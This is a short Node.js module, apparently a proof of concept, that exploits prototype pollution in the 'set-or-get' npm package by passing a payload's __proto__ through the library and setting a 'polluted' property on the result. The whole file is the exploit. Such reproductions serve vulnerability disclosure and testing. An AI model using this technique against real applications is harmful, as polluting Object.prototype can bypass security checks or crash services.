const SetOrGet = require("set-or-get");

function exploitFunction(payload) {
  const { __proto__ } = payload;
  SetOrGet({}, "__proto__", __proto__).polluted = "yes";
}

module.exports = { exploitFunction };